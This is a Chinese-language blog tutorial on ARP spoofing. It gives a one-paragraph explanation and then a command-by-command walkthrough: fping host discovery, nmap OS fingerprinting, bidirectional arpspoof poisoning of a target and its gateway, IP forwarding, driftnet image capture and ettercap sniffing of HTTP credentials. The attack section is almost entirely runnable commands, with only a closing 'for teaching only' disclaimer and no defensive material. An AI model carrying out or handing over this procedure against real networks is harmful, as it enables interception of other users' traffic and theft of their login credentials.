---
title: arp 欺骗
date: 2018-12-11 22:59:50
categories: hack
tags: [arp]
---

ARP欺骗（英语：ARP spoofing），又称ARP毒化（ARP poisoning，网上上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网上上特定计算机或所有计算机无法正常连线。

<!-- more -->

## 扫描局域网内活跃主机

```
# 安装 fping
apt install fping -y 

# 扫描活跃主机
fping -g -r 0 -s 192.168.1.0/24 | grep alive
```

## 识别主机

```
# -O 后面是需要扫描的主机列表
nmap -T4 -O 192.168.1.100 192.168.1.101
```

## arp 欺骗

双向欺骗，这里 192.168.1.100 是第一步中扫描的目标主机，192.168.1.1 是网关地址。

```
# 安装 arpspoof 工具
apt install dsniff -y

# 开始 arp 欺骗
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

这个时候目标已经不能上网了，我们开启主机的ip转发。

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## 图片探嗅

```
driftnet -i eth0
```

效果不是很理想，广告比较多。

## HTTP 账号探嗅

```
# 安装 ettercap 工具
apt install ettercap-text-only -y

# 探嗅
ettercap -Tq -i eth0
```

## 说明

> 本教程仅用于教学，切勿违法。
